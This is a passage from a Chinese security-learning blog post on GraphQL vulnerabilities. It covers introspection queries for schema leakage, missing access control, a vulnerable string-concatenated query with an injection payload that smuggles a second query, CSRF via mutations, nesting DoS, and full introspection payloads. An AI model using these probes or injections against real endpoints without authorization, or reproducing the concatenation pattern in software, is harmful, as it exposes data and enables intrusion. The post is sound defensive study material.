class="code"><pre><code class="hljs applescript"><span class="hljs-comment">##  常用的一些测试信息泄露的方法</span><br><span class="hljs-comment"># 基本判断是否存在信息泄露</span><br>&#123;<br>	__schema&#123;<br>	types&#123;<br>	<span class="hljs-built_in">name</span><br>	&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-comment">## 进一步利用</span><br>&#123;<br>	__schema&#123;<br>	types&#123;<br>	<span class="hljs-built_in">name</span><br>	fields&#123;<br>	<span class="hljs-built_in">name</span><br>	&#125;<br>	&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-comment">## 再利用,挖掘查询下支持哪些字段以及是否需要参数</span><br>&#123;<br>	__schema&#123;<br>	types&#123;<br>	<span class="hljs-built_in">name</span><br>	fields&#123;<br>	<span class="hljs-built_in">name</span><br>	args&#123;<br>	<span class="hljs-built_in">name</span><br>	&#125;<br>	type&#123;<br>	<span class="hljs-built_in">name</span><br>	&#125;<br>	&#125;<br>	&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="身份认证与权限控制不当"><a href="#身份认证与权限控制不当" class="headerlink" title="身份认证与权限控制不当"></a>身份认证与权限控制不当</h3><p>身份认证类似于在SRC中遇到的API未授权访问,只要任何人能找到接口,那他就能够使用这个接口的功能.除此之外,由于需要查询的接口有权限访问机制,如果普通用户也能访问管理员的权限,那就…..</p>
+<h3 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h3><blockquote>
+<p>有语法就会有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。</p>
+</blockquote>
+<p>如果后台直接将用户的输入拼接到<code>Graphql</code>语句中,同样能达到意想不到的攻击效果.</p>
+<p>例如:</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">String <span class="hljs-attr">book_id</span> = req.getParameter(<span class="hljs-string">&quot;bookid&quot;</span>)<br>String <span class="hljs-attr">gra_query</span> = <span class="hljs-string">&quot;&#123;BookById(id:\&quot;</span><span class="hljs-string">&quot; + book_id + &quot;</span>\<span class="hljs-string">&quot;)&#123;name,pageCount&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>假设用户输入的<code>bookid</code>参数为:<code>book-1&quot;)&#123;name&#125;authorById(&quot;author-1&quot;)&#123;firstName&#125;#</code>,由于<code>#</code>在<code>Graphql</code>中表示注释,很明显违背了后端处理的原本意图.</p>
+<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>如果网站没有设置<code>csrf-token</code>以及对同源策略作一些限制,则可以利用<code>GraphQL</code>中的<code>mutation</code>修改数据.</p>
+<h3 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a>DDos</h3><blockquote>
+<p>GraphQL中也允许对象间包含组合的嵌套关系存在，如果不对嵌套深度进行限制，就会被攻击者利用进行拒绝服务攻击。</p>
+</blockquote>
+<p>案例可以参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/184040.html">GraphQL安全指北 - FreeBuf网络安全行业门户</a>.</p>
+<p>还有好多东西完全看不懂……</p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a target="_blank" rel="noopener" href="https://github.com/doyensec/graph-ql">https://github.com/doyensec/graph-ql</a></p>
+<p>主要payload有两个,如下:</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">query IntrospectionQuery&#123;__schema&#123;queryType&#123;<span class="hljs-keyword">name</span>&#125;mutationType&#123;<span class="hljs-keyword">name</span>&#125;subscriptionType&#123;<span class="hljs-keyword">name</span>&#125;types&#123;...FullType&#125;directives&#123;<span class="hljs-keyword">name</span> description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> description fields(includeDeprecated:true)&#123;<span class="hljs-keyword">name</span> description args&#123;...InputValue&#125;<span class="hljs-keyword">type</span>&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;<span class="hljs-keyword">name</span> description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;<span class="hljs-keyword">name</span> description <span class="hljs-keyword">type</span>&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> ofType&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> ofType&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> ofType&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> ofType&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> ofType&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> ofType&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span> ofType&#123;<span class="hljs-keyword">kind</span> <span class="hljs-keyword">name</span>&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">query</span> <span class="hljs-type">IntrospectionQuery</span>&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...<span class="hljs-type">FullType</span>&#125;directives&#123;name description args&#123;...<span class="hljs-type">InputValue</span>&#125;onOperation onFragment onField&#125;&#125;&#125;fragment <span class="hljs-type">FullType</span> on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...<span class="hljs-type">InputValue</span>&#125;<span class="hljs-keyword">type</span>&#123;...<span class="hljs-type">TypeRef</span>&#125;isDeprecated deprecationReason&#125;inputFields&#123;...<span class="hljs-type">InputValue</span>&#125;interfaces&#123;...<span class="hljs-type">TypeRef</span>&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...<span class="hljs-type">TypeRef</span>&#125;&#125;fragment <span class="hljs-type">InputValue</span> on __InputValue&#123;name description type&#123;...<span class="hljs-type">TypeRef</span>&#125;defaultValue&#125;fragment <span class="hljs-type">TypeRef</span> on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>师傅们造的轮子</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/deenrookie/x-graphql">https://github.com/deenrookie/x-graphql</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/1097">https://anquan.baidu.com/article/1097</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/184040.html">GraphQL安全指北 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1528799">我的GraphQL安全学习之旅 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/02/FileBrowser-CSRF/">
+                        <span class="hidden-mobile">FileBrowser-CSRF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
